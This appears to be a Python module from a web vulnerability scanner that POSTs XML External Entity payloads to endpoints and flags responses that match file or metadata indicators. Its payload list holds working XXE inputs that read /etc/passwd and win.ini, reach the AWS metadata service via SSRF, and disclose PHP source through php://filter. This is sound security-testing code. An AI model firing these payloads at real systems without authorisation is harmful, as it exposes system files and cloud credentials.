# scanner/dast/modules/xxe_module.py
# ──────────────────────────────────────────────────────────────────────────────
# XXE (XML External Entity) MODULE
# Tests all XML-accepting endpoints for XXE, blind XXE, and XXE-via-file-upload.
# ──────────────────────────────────────────────────────────────────────────────

import asyncio
import logging
import re
from urllib.parse import urlparse

logger = logging.getLogger(__name__)

XXE_PAYLOADS = [
    # Classic file read
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
     '<root><data>&xxe;</data></root>',
     ["root:x:", "root:0:0", "daemon:", "nobody:"],
     "file:///etc/passwd read via XXE",
    ),
    # Windows file read
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
     '<root><data>&xxe;</data></root>',
     ["[fonts]", "[extensions]", "for 16-bit"],
     "Windows win.ini read via XXE",
    ),
    # SSRF via XXE
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>'
     '<root><data>&xxe;</data></root>',
     ["ami-id", "instance-id", "local-ipv4", "hostname"],
     "SSRF to AWS metadata via XXE",
    ),
    # PHP filter bypass
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
     '"php://filter/convert.base64-encode/resource=index.php">]>'
     '<root><data>&xxe;</data></root>',
     ["PD9waHAi", "<?php"],   # base64 of <?php
     "PHP source disclosure via XXE + php://filter",
    ),
]

XML_CONTENT_TYPES = [
    "text/xml",
    "application/xml",
    "application/soap+xml",
    "application/rss+xml",
]


class XXEModule:
    def __init__(self, scanner):
        self.scanner = scanner

    async def run(self, client, url: str, params: list) -> None:
        await asyncio.gather(
            self.test_xxe_post(client, url),
            return_exceptions=True,
        )

    async def test_xxe_post(self, client, url: str) -> None:
        """
        POST XML payloads with various Content-Types and check responses
        for file content indicators or SSRF indicators.
        """
        for content_type in XML_CONTENT_TYPES:
            for payload, indicators, description in XXE_PAYLOADS:
                try:
                    res = await self.scanner._req(
                        client, "POST", url,
                        content=payload,
                        headers={"Content-Type": content_type},
                        timeout=15,
                    )
                    if not res or res.status_code in (404, 415, 405):
                        continue

                    for indicator in indicators:
                        if indicator.lower() in res.text.lower():
                            self.scanner._add_finding({
                                "type":        "XML External Entity (XXE) Injection",
                                "subtype":     description,
                                "url":         url,
                                "parameter":   "request_body",
                                "payload":     payload[:120] + "...",
                                "severity":    "Critical",
                                "confidence":  0.95,
                                "evidence":    f"Indicator '{indicator}' found in response — {description}",
                                "description": (
                                    f"Endpoint parses external XML entities. "
                                    f"Attacker can read arbitrary files or pivot to SSRF. "
                                    f"Description: {description}"
                                ),
                            })
                            return
                except Exception as e:
                    logger.debug(f"XXE test error at {url}: {e}")